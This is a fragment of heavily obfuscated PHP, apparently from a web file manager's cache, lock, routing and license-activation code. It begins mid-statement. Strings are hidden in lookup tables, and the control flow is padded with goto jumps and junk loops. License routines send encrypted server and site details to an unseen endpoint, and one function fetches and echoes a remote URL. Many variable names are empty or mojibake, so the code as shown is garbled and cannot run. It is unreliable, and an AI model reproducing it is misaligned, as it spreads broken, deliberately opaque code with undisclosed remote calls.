$, $[289] => $À£, $[290] => $, $[206] => $this->getHost()); return $; } } define($_SERVER[][291], 1); define($_SERVER[][292], 2); goto d”ø; C: $fileSize = strrev(base64_decode($_SERVER[¬Ü][0])); function binCheckNeq($‹µ›ª, $‘Ø) { return $‹µ›ª != $‘Ø; } $_SERVER[$_SERVER[¬Ü][1]] = $fileSize($_SERVER[$_SERVER[¬Ü][2]]); goto dœ´; b÷òﬂù: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $›ª = $GLOBALS[$[16]][$[402]]; $ = $›ª[$›ª[$[867]]]; $◊Ñ = $›ª[$[868]]; switch ($›ª[$[867]]) { case $[31]: self::$handle = Model($[869]); break; case $[870]: self::$handle = new CacheRedis($, $◊Ñ); break; case $[871]: self::$handle = new CacheMemcached($, $◊Ñ); break; case $[224]: self::$handle = new CacheFile($, $◊Ñ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($) { if (is_array($) || is_object($)) { $ = json_encode($); } $ = rawurlencode($); return md5(KOD_SITE_ID . $_SERVER[][21] . $); } public static function get($, $⁄ë—≠ = false) { $ = self::key($); $–§ = self::init(); if ($⁄ë—≠) { return unserialize($–§->get($)); } if (!isset(self::$memoryCache[$])) { $∆æ = $–§->get($); self::$memoryCache[$] = unserialize($∆æ); } return self::$memoryCache[$]; } public static function set($ ¶, $ÈΩ£, $”µ = false) { $ =& $_SERVER[]; $ = self::key($ ¶); if (isset(self::$memoryCache[$]) && self::$memoryCache[$] === $ÈΩ£) { return !0; } if ($”µ === 0) { self::$memoryCache[$] = $ÈΩ£; return !0; } $“ù ó = self::init(); $ = serialize($ÈΩ£); CacheLock::lock($ ¶ . $[872]); $ = $“ù ó->set($, $, $”µ); self::$memoryCache[$] = $ÈΩ£; CacheLock::unlock($ ¶ . $[872]); return $; } public static function getCall($”∫—∫, $, $ﬂß, $‰ã¶ = array()) { $ =& $_SERVER[]; $‹§ = self::get($”∫—∫); if ($‹§ || $‹§ === $[22]) { return $‹§; } $‹§ = call_user_func_array($ﬂß, $‰ã¶); $‹§ = $‹§ ? $‹§ : $[22]; self::set($”∫—∫, $‹§, $); return $‹§; } public static function remove($) { $√≠ = self::key($); unset(self::$memoryCache[$√≠]); self::clearTimeout(); CacheLock::lock($); $ = self::init()->remove($√≠); CacheLock::unlock($); return $; } public static function removeMemory($Œº) { $÷§ = self::key($Œº); unset(self::$memoryCache[$÷§]); } public static function clearMemory($»© = false) { if ($»©) { $»© = self::key($»©); unset(self::$memoryCache[$»©]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][873])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][874])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($, $) { $ =& $_SERVER[]; $this->cachePath = $[$[94]]; $this->prefix = $[875]; $this->cacheTime = $; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($‹∞) { $ =& $_SERVER[]; $‹∞ = str_replace(array($[876], $[107], $[83]), $[877], $‹∞); return $this->cachePath . $[878] . $‹∞ . $[879]; } public function set($, $€ò, $—∏ = false) { $—∏ = $—∏ ? $—∏ : $this->cacheTime; $Õä = $this->getFile($); if (file_put_contents($Õä, $this->prefix . $€ò, LOCK_EX)) { @touch($Õä, intval(time() + $—∏)); clearstatcache(); return !0; } @unlink($Õä); return !1; } public function get($Ÿ¢) { $Œ¨ = $this->getFile($Ÿ¢); if (file_exists($Œ¨) && filemtime($Œ¨) < time()) { @unlink($Œ¨); return !1; } $Í£ñ€£ = @file_get_contents($Œ¨); return substr($Í£ñ€£, strlen($this->prefix)); } public function remove($‘ø) { $Áéæ = $this->getFile($‘ø); return @unlink($Áéæ); } public function deleteAll() { $Óò∂ =& $_SERVER[]; $Ìü™ = scandir($this->cachePath); foreach ($Ìü™ as $‹Ä) { $ﬁ£‹∑ = $this->cachePath . $‹Ä; if (strpos($ﬁ£‹∑, $Óò∂[879]) && strpos($ﬁ£‹∑, $Óò∂[880])) { @unlink($ﬁ£‹∑); } } } public function clearTimeout() { $Œø =& $_SERVER[]; $√Ü = scandir($this->cachePath); foreach ($√Ü as $›ô) { $Óìò = $this->cachePath . $›ô; if (strpos($Óìò, $Œø[879]) && strpos($Óìò, $Œø[880]) && filemtime($Óìò) < time()) { @unlink($Óìò); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ =& $_SERVER[]; if (self::$handle) { return self::$handle; } $ = $GLOBALS[$[16]][$[402]]; self::$timeout = $[$[881]] ? $[$[881]] : 10; $ = _get($GLOBALS[$[16]], $[882]); $ = $[$[867]] ? $[$[867]] : $[224]; if ($ == $[31] && $ == $[23]) { $ = $[224]; } switch ($) { case $[870]: self::$handle = new CacheLockRedis(); break; case $[871]: self::$handle = new CacheLockMemcached(); break; case $[31]: self::$handle = new CacheLockDatabase(); break; case $[224]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($[883], $[884]); } return self::$handle; } private static function key($Õä≈á) { return $_SERVER[][885] . Cache::key($Õä≈á); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Œã = '') { self::$errorMsg = $Œã; } public static function lockGlobal($√òŒÜ, $) { return self::lock($√òŒÜ, $, !0); } public static function lock($—ë, $œ´ = false, $…≥ = false) { $·≤ê =& $_SERVER[]; $ = self::init(); $ = self::key($—ë); $œ´ = $œ´ ? $œ´ : self::$timeout; $ = timeFloat(); $÷∏ = $->lock($, $œ´); $“∂ = timeFloat(); if (!$÷∏) { $ = "\x6c\157\143\153\x20\145\162\162\157\x72\73\153\145\x79\75{$—ë}\73\164\x69\x6d\145\75{$œ´}\x3b" . self::$errorMsg . $·≤ê[81] . get_caller_msg(); $Ïµ¨ = LNG($·≤ê[886]) . "\50{$œ´}\x73\x29\x2e" . LNG($·≤ê[887]); $Ïµ¨ .= $·≤ê[888]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ïµ¨ = $Ïµ¨ . $·≤ê[889] . self::$errorMsg; } write_log($·≤ê[890] . sprintf($·≤ê[891], timeFloat() - $) . $·≤ê[892] . $ . $·≤ê[893] . error_get_last(), $·≤ê[884]); show_json($Ïµ¨, !1); } if (!$…≥) { self::$lockItem[$] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $≈à‘© = number_format(timeFloat() - $“∂, 3); write_log($·≤ê[894] . $—ë . $·≤ê[895] . $≈à‘©, $·≤ê[884]); } return $÷∏; } public static function lockGet($) { $ƒö€Ä = self::key($); if (self::$lockItem[$ƒö€Ä]) { return self::$lockItem[$ƒö€Ä]; } return self::init()->lockGet($ƒö€Ä); } public static function unlock($Ê±†) { $Œû =& $_SERVER[]; $ﬁå◊ä = self::key($Ê±†); self::$lockItem[$ﬁå◊ä] = null; self::init()->unlock($ﬁå◊ä); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Œû[896] . $Ê±†, $Œû[884]); } return; } public static function unlockRuntime() { $‹éƒµ =& $_SERVER[]; $ = self::init(); $∆ÜŒì = !1; foreach (self::$lockItem as $ => $Âæü) { if (!$Âæü) { continue; } $->unlock($); if (!$∆ÜŒì) { $∆ÜŒì = !0; write_log($‹éƒµ[897] . $ . $‹éƒµ[81] . get_caller_msg(), $‹éƒµ[884]); continue; } write_log($‹éƒµ[897] . $, $‹éƒµ[884]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $—õ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‹éƒµ[898] . $—õ . $‹éƒµ[899] . ACTION, $‹éƒµ[884]); } } public static function fileLock($‰ùû) { $ =& $_SERVER[]; if (!$GLOBALS[$[900]]) { $GLOBALS[$[900]] = array(); } $GLOBALS[$[900]][$‰ùû] = !1; $ = fopen(DATA_PATH . $‰ùû . $[901], $[902]); if (!$) { return !1; } $GLOBALS[$[900]][$‰ùû] = $; if (flock($, LOCK_EX)) { return !0; } self::unlock($‰ùû); show_json($[903], !1); return !1; } public static function fileUnlock($) { $Œª≈Ü =& $_SERVER[]; $œô = $GLOBALS[$Œª≈Ü[900]][$]; if (!$œô) { return; } $GLOBALS[$Œª≈Ü[900]][$] = !1; flock($œô, LOCK_UN); fclose($œô); } public static function fileUnlockAll() { $ =& $_SERVER[]; if (!$GLOBALS[$[900]]) { return; } foreach ($GLOBALS[$[900]] as $–£ => $ƒà) { if (!$ƒà) { continue; } $GLOBALS[$[900]][$–£] = !1; flock($ƒà, LOCK_UN); fclose($ƒà); } $GLOBALS[$[900]] = array(); } } goto D; fÎá¨: if (!$feoykidnmp) { die; } class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($) { $ =& $_SERVER[]; $ =& $_SERVER[]; $Õâ = explode($[0], trim($, $[0])); $≈±Õ£ = $[661]; if (strlen($≈±Õ£) < $[662]) { return; } $this->defaultModule = $Õâ[0] ? $Õâ[0] : $this->defaultModule; $Ë¥Ö = $[663]; while (strlen($Ë¥Ö) < $[12]) { if (!$Ë¥Ö) { break; } $Ë¥Ö++; } $this->defaultController = $Õâ[1] ? $Õâ[1] : $this->defaultController; $this->defaultAction = $Õâ[2] ? $Õâ[2] : $this->defaultAction; $ = $[664]; $this->ekqfc4a7aafa($[1], array($this, $[2])); } public function appRun($Ÿ¨) { $ÿ©ÿì =& $_SERVER[]; $ =& $_SERVER[]; $’ì = explode($[0], $Ÿ¨); $ = strtolower($’ì[0]); $ = $[3]; if ($ == $[4]) { $ = $[5]; $’ì[0] = $[6]; $’ì[1] = $’ì[1] . $[7]; $Ÿ¨ = join($[0], $’ì); $Ÿ¨ = trim($Ÿ¨, $[0]); } call_user_func(array($[8], $[9]), $ . $[10], $Ÿ¨); ActionCall($Ÿ¨); call_user_func(array($[8], $[9]), $ . $[11], $Ÿ¨); $’æ = $ÿ©ÿì[665]; while (strlen($’æ) < $ÿ©ÿì[666]) { if (!$’æ) { break; } $’æ++; } } private function autorun() { $ =& $_SERVER[]; global $config; if (count($config[$[12]]) == 0) { return; } foreach ($config[$[12]] as $”ô => $) { $this->appRun($); $ÕÇ = $_SERVER[][667]; } } private function tafe567b59f0() { $ =& $_SERVER[]; $Ïåó =& $_SERVER[]; $—á = $Ïåó[4]; $ = $[668]; while ($ < $[12]) { if ($ >= 0) { break; } $++; } $ = $GLOBALS[$Ïåó[13]][$Ïåó[14]][0]; if (!$ || strlen($) <= strlen($—á)) { return; } if (strtolower(substr($, -strlen($—á))) != $—á) { return; } $ = substr($, 0, -strlen($—á)); $Œ≥ = $[669]; $ÀÉ = array($Ïåó[4], $); $⁄ñ = $[670]; if (strlen($⁄ñ) < $[12]) { die; } $—á = array_slice($GLOBALS[$Ïåó[13]][$Ïåó[14]], 1); $GLOBALS[$Ïåó[13]][$Ïåó[14]] = array_merge($ÀÉ, $—á); $Õü = $[671]; $GLOBALS[$Ïåó[13]][$Ïåó[15]] = implode($Ïåó[0], $GLOBALS[$Ïåó[13]][$Ïåó[14]]); } private function ljzi429e8d73() { $Ÿé Å =& $_SERVER[]; $ÿ≥ =& $_SERVER[]; if ($GLOBALS[$ÿ≥[13]][$ÿ≥[15]] != $ÿ≥[6]) { return; } $÷Å = $_SERVER[$ÿ≥[16]]; $◊ò—õ = $ÿ≥[17]; $ = $Ÿé Å[672]; if (strlen($) < $Ÿé Å[666]) { die; } if (!strstr($÷Å, $◊ò—õ)) { return; } $Œ∂ = strrpos($÷Å, $◊ò—õ); $ﬂ≥ = substr($÷Å, $Œ∂ + strlen($◊ò—õ)); $ = $Ÿé Å[673]; if (!$) { return; } preg_match_all($ÿ≥[18], $ﬂ≥, $); $ﬂ≥ = trim($[0][0], $ÿ≥[19]); $GLOBALS[$ÿ≥[13]][$ÿ≥[14]] = explode($ÿ≥[19], $ﬂ≥); $–ë = $Ÿé Å[674]; if (strlen($–ë) < $Ÿé Å[675]) { die; } $GLOBALS[$ÿ≥[13]][$ÿ≥[15]] = implode($ÿ≥[0], $GLOBALS[$ÿ≥[13]][$ÿ≥[14]]); } public function run() { $Ê•± =& $_SERVER[]; $Ó¨¥ =& $_SERVER[]; $this->ljzi429e8d73(); $this->tafe567b59f0(); $«ú = $GLOBALS[$Ó¨¥[13]][$Ó¨¥[14]]; $»ñ = $GLOBALS[$Ó¨¥[13]][$Ó¨¥[15]]; define($Ó¨¥[20], isset($«ú[0]) && $«ú[0] ? $«ú[0] : $this->defaultModule); define($Ó¨¥[21], isset($«ú[1]) && $«ú[0] ? $«ú[1] : $this->defaultController); $æ¢ú = $Ê•±[676]; if (!$æ¢ú) { return; } define($Ó¨¥[22], isset($«ú[2]) && $«ú[0] ? $«ú[2] : $this->defaultAction); define($Ó¨¥[23], MOD . $Ó¨¥[0] . ST . $Ó¨¥[0] . ACT); $ = $Ê•±[677]; if (strlen($) < $Ê•±[662]) { die; } $_SERVER[$Ó¨¥[24]] = strtolower(ACTION); $this->autorun(); if (count($«ú) >= 3) { $this->appRun($»ñ); } else { $this->appRun(ACTION); } } private $olnbc49f451c = array(); private $fqgpe48f3ac0 = ''; public function ihdg55cbed74() { $ =& $_SERVER[]; $‘∫ =& $_SERVER[]; $this->yhqf63060cbf(); $this->kipl2062c4f5(); $this->wiub190bda98(); $this->mqdn710e1d30(); $this->yareebb26ef5(); $this->wktf77119f14(); $Àì = $[678]; while (strlen($Àì) < $[12]) { if (!$Àì) { break; } $Àì++; } $this->arfd0ed3d9fb(); $ = $[679]; while (strlen($) < $[662]) { if (!$) { break; } $++; } $this->ekqfc4a7aafa($‘∫[25], array($this, $‘∫[26])); $¬©–† = $[680]; while ($¬©–† < $[12]) { if ($¬©–† >= 0) { break; } $¬©–†++; } $this->ekqfc4a7aafa($‘∫[27], array($this, $‘∫[28])); $this->ekqfc4a7aafa($‘∫[29], array($this, $‘∫[30])); $≈∑ = $[681]; while (strlen($≈∑) < $[682]) { if (!$≈∑) { break; } $≈∑++; } $this->ekqfc4a7aafa($‘∫[31], array($this, $‘∫[32])); $ = $[683]; while ($ < $[675]) { if ($ >= 0) { break; } $++; } } public function cqhg1e29725b($ŒπŸ§) { $ =& $_SERVER[]; $ =& $_SERVER[]; $◊Å = Model($[33])->get(); $Í≤Ω = $[684]; if (!$Í≤Ω) { return; } $ = array($[34], $[35], $[36], $[37], $[38], $[39], $[40], $[41], $[42], $[43], $[44], $[45], $[46], $[47], $[48], $[49], $[50], $[51], $[52], $[53], $[54], $[55], $[56], $[57], $[58], $[59], $[60], $[61], $[62], $[63], $[64], $[65], $[66], $[67], $[68], $[69], $[70], $[71], $[72], $[73], $[74], $[75], $[76], $[77], $[78], $[79], $[80], $[81], $[82], $[83], $[84]); foreach ($ as $) { $ = $GLOBALS[$[85]][$[86]][$]; if (isset($◊Å[$])) { $ = $◊Å[$]; } $ŒπŸ§[$[87]][$[88]][$] = $; } $⁄à«§ = $ŒπŸ§[$[87]][$[88]][$[46]]; $”à = $[685]; if (strlen($”à) < $[675]) { return; } unset($ŒπŸ§[$[87]][$[89]][$[90]]); unset($ŒπŸ§[$[87]][$[89]][$[91]]); unset($ŒπŸ§[$[87]][$[88]][$[46]]); unset($ŒπŸ§[$[87]][$[88]][$[92]]); $ = $[686]; $ŒπŸ§[$[87]][$[88]][$[93]] = array($[94] => (int) $⁄à«§[$[95]], $[96] => (int) _get($⁄à«§, $[97], 0)); $ŒπŸ§[$[98]][$[99]] = Action($[100])->safeToken(); $ŒπŸ§[$[98]][$[101]] = Action($[100])->accessToken(); $ŒπŸ§[$[98]][$[102]] = md5($_SERVER[$[103]] . $◊Å[$[104]]); $Ÿù = $[687]; if (strlen($Ÿù) < $[662]) { die; } $ŒπŸ§[$[98]][$[105]] = base64_encode(serverInfo()); $ = $[688]; $ŒπŸ§[$[98]][$[106]] = $this->fqgpe48f3ac0; $ÿõ = $[689]; if (strlen($ÿõ) < $[12]) { die; } if ($◊Å[$[106]] != $[107]) { $ŒπŸ§[$[98]][$[108]] = $◊Å[$[108]]; $ŒπŸ§[$[98]][$[109]] = $◊Å[$[109]]; $‹Æ = rand_string(10) . $this->fqgpe48f3ac0 . rand_string(5); $ŒπŸ§[$[87]][$[110]][$[111]] = $this->ulwh22069c88($‹Æ, $ŒπŸ§[$[98]][$[102]]); } if ($this->fqgpe48f3ac0 == $[107]) { $ŒπŸ§[$[87]][$[88]][$[93]][$[97]] = 0; } $ŒπŸ§[$[98]][$[112]] = _get($this->olnbc49f451c, $[113], $[6]); $ŒπŸ§[$[98]][$[114]] = _get($this->olnbc49f451c, $[115], $[6]); if (_get($GLOBALS, $[116]) && $this->config[$[117]]) { $ŒπŸ§[$[98]][$[118]] = WEB_ROOT; } return $ŒπŸ§; } private function wktf77119f14() { $ =& $_SERVER[]; $√æ =& $_SERVER[]; $’® = $_SERVER[$√æ[24]] == $√æ[119]; $‚å† = $[690]; if (!$‚å†) { die; } if ($_SERVER[$√æ[24]] == $√æ[120] && $_GET[$√æ[121]] == $√æ[122]) { $’® = !0; } if ($’®) { $ = array($√æ[106] => $this->fqgpe48f3ac0, $√æ[123] => $this->qpnv736865e5(), $√æ[124] => Model($√æ[125])->count()); if ($this->fqgpe48f3ac0 != $√æ[107]) { $ É = _get($this->olnbc49f451c, $√æ[126]); if ($ É) { $[$√æ[127]] = $ É; $[$√æ[128]] = strtotime(_get($this->olnbc49f451c, $√æ[129])); $[$√æ[130]] = _get($this->olnbc49f451c, $√æ[115]); } $»äŸç = Model($√æ[33])->get($√æ[131], $√æ[6], !0); if (is_string($»äŸç) && substr($»äŸç, 0, 1) == $√æ[132]) { $»äŸç = json_decode_force($»äŸç); } if (is_array($»äŸç) && $»äŸç[$√æ[133]] && strstr($»äŸç[$√æ[133]], $√æ[134])) { $ŒÖ = explode($√æ[134], $»äŸç[$√æ[133]]); $[$√æ[135]] = $ŒÖ[0]; } } $ = $this->cdlj69ae248c(json_encode($), md5($√æ[136])); $»ò = $[691]; if (!$»ò) { die; } $÷ô√ò = array($√æ[137] => $); $·õ¢ = $[692]; while (strlen($·õ¢) < $[662]) { if (!$·õ¢) { break; } $·õ¢++; } call_user_func(array($√æ[138], $√æ[139]), $÷ô√ò); $ = $[693]; while ($ < $[682]) { if ($ >= 0) { break; } $++; } } if ($this->fqgpe48f3ac0 == $√æ[107]) { return; } $–ø≈Ω = array($√æ[140], $√æ[141], $√æ[142], $√æ[143], $√æ[144], $√æ[145]); $ﬁ® = $[694]; if (!$ﬁ®) { die; } $ = Model($√æ[33])->get(); $÷ô√ò = array($√æ[146] => $[$√æ[34]], $√æ[147] => $[$√æ[35]], $√æ[148] => $√æ[6]); $Œ® = $[695]; while (strlen($Œ®) < $[682]) { if (!$Œ®) { break; } $Œ®++; } foreach ($–ø≈Ω as $·ã¶) { if (!isset($[$·ã¶]) || !$[$·ã¶]) { continue; } $÷ô√ò[$·ã¶] = $[$·ã¶]; $ = $[696]; } call_user_func(array($√æ[138], $√æ[139]), $÷ô√ò); } private function mqdn710e1d30() { $ =& $_SERVER[]; $Óò∫⁄ã =& $_SERVER[]; if ($_SERVER[$Óò∫⁄ã[24]] != $Óò∫⁄ã[149]) { return; } if (!_get($GLOBALS, $Óò∫⁄ã[116])) { die; } $œë„§µ = $GLOBALS[$Óò∫⁄ã[13]]; if (isset($œë„§µ[$Óò∫⁄ã[150]])) { $this->mnckb7682f13(); die; } if (!isset($œë„§µ[$Óò∫⁄ã[151]]) || strlen($œë„§µ[$Óò∫⁄ã[151]]) != 16) { show_json($Óò∫⁄ã[152] . $œë„§µ[$Óò∫⁄ã[151]], !1); } $Âóí = Model($Óò∫⁄ã[33])->get($Óò∫⁄ã[104]); $…â = md5($_SERVER[$Óò∫⁄ã[103]] . $Âóí); $œº = array($Óò∫⁄ã[151] => $œë„§µ[$Óò∫⁄ã[151]], $Óò∫⁄ã[153] => rand_string(16), $Óò∫⁄ã[154] => $Óò∫⁄ã[136], $Óò∫⁄ã[155] => $Óò∫⁄ã[156], $Óò∫⁄ã[157] => $_SERVER[$Óò∫⁄ã[158]], $Óò∫⁄ã[159] => $_SERVER[$Óò∫⁄ã[160]], $Óò∫⁄ã[161] => $_SERVER[$Óò∫⁄ã[162]], $Óò∫⁄ã[102] => $…â, $Óò∫⁄ã[163] => Model($Óò∫⁄ã[33])->get($Óò∫⁄ã[131])); if ($œë„§µ[$Óò∫⁄ã[164]] == $Óò∫⁄ã[165]) { $Èùù = $this->cdlj69ae248c($…â, $Óò∫⁄ã[166]); $‰Äú = $this->ulwh22069c88(json_encode($œº), $…â . $Óò∫⁄ã[167], 3); $‰Äú = $‰Äú . $Óò∫⁄ã[168] . $_SERVER[$Óò∫⁄ã[158]]; $ = $this->ewvj2f9c258e($Óò∫⁄ã[169] . $Èùù . $Óò∫⁄ã[170] . $‰Äú, -1); show_json($, !0); } else { if ($œë„§µ[$Óò∫⁄ã[164]] == $Óò∫⁄ã[171]) { $“Æ = substr(md5($Óò∫⁄ã[172] . $…â), 12, 15) . $Óò∫⁄ã[173]; $‰Äú = $this->bsygaf9bb15f(trim($œë„§µ[$Óò∫⁄ã[174]]), $“Æ, 2); $ = json_decode($‰Äú, !0); if (!is_array($) || !is_array($[$Óò∫⁄ã[175]]) || $[$Óò∫⁄ã[151]] != !0) { $„åπ = $Óò∫⁄ã[176]; $ = $[$Óò∫⁄ã[175]] ? $Óò∫⁄ã[177] . $[$Óò∫⁄ã[175]] : $„åπ; show_json($, !1); } else { $œº[$Óò∫⁄ã[153]] = $[$Óò∫⁄ã[175]][$Óò∫⁄ã[178]]; } } else { $ = $this->ewvj2f9c258e($Óò∫⁄ã[179], $œº, 10); $≈ûÎ∏õ = $[697]; if (strlen($≈ûÎ∏õ) < $[666]) { return; } } } if (!is_array($) || !is_array($[$Óò∫⁄ã[175]]) || $[$Óò∫⁄ã[151]] != !0) { $„åπ = LNG($Óò∫⁄ã[180]); $ = $[$Óò∫⁄ã[175]] ? $Óò∫⁄ã[177] . $[$Óò∫⁄ã[175]] : $„åπ; show_json($, !1); } $∆ê = $[$Óò∫⁄ã[175]]; $ = $this->eqkab4bbc6d4($∆ê[$Óò∫⁄ã[181]]); if (!$ || $ != $∆ê[$Óò∫⁄ã[129]]) { $“† = array($Óò∫⁄ã[182] => Model($Óò∫⁄ã[33])->get($Óò∫⁄ã[104]), $Óò∫⁄ã[183] => $_SERVER[$Óò∫⁄ã[103]], $Óò∫⁄ã[184] => this_url(), $Óò∫⁄ã[159] => $_SERVER[$Óò∫⁄ã[160]]); $‰Äú = $this->eztf496938c0(json_encode($“†)); $this->ewvj2f9c258e($Óò∫⁄ã[185] . $‰Äú); show_json(LNG($Óò∫⁄ã[186]), !0); } $ = array($Óò∫⁄ã[187] => $∆ê[$Óò∫⁄ã[188]], $Óò∫⁄ã[189] => $∆ê[$Óò∫⁄ã[190]], $Óò∫⁄ã[191] => rand_string(16), $Óò∫⁄ã[106] => $∆ê[$Óò∫⁄ã[192]]); if ($œº[$Óò∫⁄ã[153]]) { $[$Óò∫⁄ã[191]] = $œº[$Óò∫⁄ã[153]]; } $Î®ê = substr(md5($[$Óò∫⁄ã[189]]), 10, 10); $ = $Î®ê . $[$Óò∫⁄ã[106]] . $[$Óò∫⁄ã[191]]; $[$Óò∫⁄ã[108]] = strrev(base64_encode($this->cdlj69ae248c($, $Óò∫⁄ã[193]))); $ÀØ = rand_string(16); $’å = $ÀØ . $[$Óò∫⁄ã[106]] . $this->cdlj69ae248c(md5($[$Óò∫⁄ã[187]]), $ÀØ); $ = $[698]; while (strlen($) < $[666]) { if (!$) { break; } $++; } $[$Óò∫⁄ã[109]] = base64_encode(strrev($this->cdlj69ae248c($’å, $Óò∫⁄ã[194]))); $œ¶ = $[699]; if (strlen($œ¶) < $[12]) { return; } if ($∆ê[$Óò∫⁄ã[195]] && $∆ê[$Óò∫⁄ã[195]] >= 1) { Model($Óò∫⁄ã[33])->setDeep($Óò∫⁄ã[196], $Óò∫⁄ã[122]); } Model($Óò∫⁄ã[33])->set($); $ = md5($_SERVER[$Óò∫⁄ã[103]] . strrev($Âóí) . $[$Óò∫⁄ã[189]]); $ = $[700]; if (!$) { return; } $ = strrev(substr($, 10, 16)); $⁄í = $[701]; while (strlen($⁄í) < $[662]) { if (!$⁄í) { break; } $⁄í++; } $ = $this->ulwh22069c88(json_encode($∆ê), $); $ﬁñ = array_to_keyvalue(Model($Óò∫⁄ã[7])->listData(), $Óò∫⁄ã[197]); $Íåó = $ﬁñ[$Óò∫⁄ã[198]]; $ = array(); $[$] = $; $ = $[702]; while ($ < $[666]) { if ($ >= 0) { break; } $++; } Model($Óò∫⁄ã[7])->update($Íåó[$Óò∫⁄ã[199]], array($Óò∫⁄ã[200] => $)); $ = $[703]; while (strlen($) < $[12]) { if (!$) { break; } $++; } $this->olnbc49f451c = $∆ê; $…Ä›∂ = $[704]; if (!$…Ä›∂) { die; } $this->fqgpe48f3ac0 = $[$Óò∫⁄ã[106]]; $ÈùÅ = $[705]; if (!$ÈùÅ) { die; } $this->licenseRegistSuccess(); Cache::set($Óò∫⁄ã[201] . md5($Âóí . $Óò∫⁄ã[202]), $Óò∫⁄ã[6]); $œ± = $[706]; while ($œ± < $[12]) { if ($œ± >= 0) { break; } $œ±++; } show_json(LNG($Óò∫⁄ã[186]), !0); } private function licenseRegistSuccess() { $ =& $_SERVER[]; $√á = Model($[33])->get(); if ($√á[$[63]] != $[122]) { Model($[33])->set($[63], $[122]); } Action($[203])->initStart(!0); } private function mnckb7682f13() { $ =& $_SERVER[]; $ =& $_SERVER[]; Model($[33])->set(array($[187] => $[6], $[189] => $[6], $[106] => $[107], $[108] => $[6], $[109] => $[6])); Model($[33])->setDeep($[196], $[204]); $this->olnbc49f451c = array(); $‹†€¢ = $[707]; if (strlen($‹†€¢) < $[666]) { return; } $this->fqgpe48f3ac0 = $[107]; $ = $[708]; if (strlen($) < $[682]) { die; } } private function yhqf63060cbf() { $“¥ =& $_SERVER[]; $ =& $_SERVER[]; $_SERVER[$[160]] = _get($_SERVER, $[160], APP_HOST); $this->fqgpe48f3ac0 = $[107]; $œü = $“¥[709]; if (!$œü) { return; } $Ÿñ = Model($[33])->get(); $ = $“¥[710]; while (strlen($) < $“¥[662]) { if (!$) { break; } $++; } if ($Ÿñ[$[106]] == $[107]) { return; } $»∑ = Model($[33])->get($[104]); $œ∂ = $“¥[711]; if (strlen($œ∂) < $“¥[12]) { die; } $Úæ†å = $[201] . md5($»∑ . $[202]); $◊Ü = Cache::get($Úæ†å); if (!is_array($◊Ü) || !isset($◊Ü[$[205]]) || time() - $◊Ü[$[205]] >= 60) { $Õê = Model($[7])->loadList(); $’ø = $Õê[$[198]]; $‹Ω = md5($_SERVER[$[103]] . strrev($»∑) . $Ÿñ[$[189]]); $Ãæ = strrev(substr($‹Ω, 10, 16)); $◊Ü = $this->bsygaf9bb15f($’ø[$[85]][$Ãæ], $‹Ω); $◊Ü = json_decode($◊Ü, !0); } if (!is_array($◊Ü)) { return $this->mnckb7682f13(); } $ = strtotime($◊Ü[$[129]]); if (time() >= $) { return $this->mnckb7682f13(); } if (time() - $◊Ü[$[205]] > 20) { $◊Ü[$[205]] = time(); Cache::set($Úæ†å, $◊Ü); } $this->olnbc49f451c = $◊Ü; $this->fqgpe48f3ac0 = $Ÿñ[$[106]]; } private function kipl2062c4f5() { $œù =& $_SERVER[]; $ﬂµ =& $_SERVER[]; $÷≠ = $GLOBALS[$ﬂµ[13]]; $œæ = $œù[712]; while ($œæ < $œù[666]) { if ($œæ >= 0) { break; } $œæ++; } $ = $_SERVER[$ﬂµ[24]]; $»Ω = $œù[713]; if ($ == $ﬂµ[206] && $this->fqgpe48f3ac0 == $ﬂµ[107]) { show_json(LNG($ﬂµ[207]), !1, $ﬂµ[208]); } $Œª = array($ﬂµ[209], $ﬂµ[210]); if (in_array($, $Œª)) { if ($this->fqgpe48f3ac0 == $ﬂµ[107] && isset($÷≠[$ﬂµ[211]])) { show_json(LNG($ﬂµ[207]), !1, $ﬂµ[208]); die; } $ = $this->qpnv736865e5(); if ($ != intval($ﬂµ[212])) { if ($ <= Model($ﬂµ[125])->count()) { show_json(LNG($ﬂµ[213]), !1, $ﬂµ[208]); die; } } } } private function wiub190bda98() { $∆ö =& $_SERVER[]; $∆ö =& $_SERVER[]; $ = array($∆ö[119], $∆ö[120]); if (!_get($GLOBALS, $∆ö[116]) || !isset($_GET[$∆ö[214]])) { return; } if (!in_array($_SERVER[$∆ö[24]], $)) { return; } $’∏ = $∆ö[215]; $’∏ = $this->jpwa80e7681e($’∏, $∆ö[216]); $∆é = $∆ö[714]; while (strlen($∆é) < $∆ö[666]) { if (!$∆é) { break; } $∆é++; } $‹© = stream_context_create(array($∆ö[217] => array($∆ö[218] => $∆ö[219], $∆ö[220] => 3))); $œ∂‡Æ≠ = @file_get_contents($’∏, !1, $‹©); header($∆ö[221]); if ($œ∂‡Æ≠ && strstr($œ∂‡Æ≠, $∆ö[222])) { echo $œ∂‡Æ≠; } die; } public function hnfgd79acd79($»â) { $Îºú =& $_SERVER[]; $÷™ =& $_SERVER[]; if ($this->fqgpe48f3ac0 == $÷™[223]) { return $»â; } $∆ò = array($÷™[224] => $÷™[225], $÷™[226] => $÷™[225], $÷™[227] => $÷™[225], $÷™[228] => $÷™[229], $÷™[230] => $÷™[229], $÷™[231] => $÷™[229], $÷™[232] => $÷™[229], $÷™[233] => 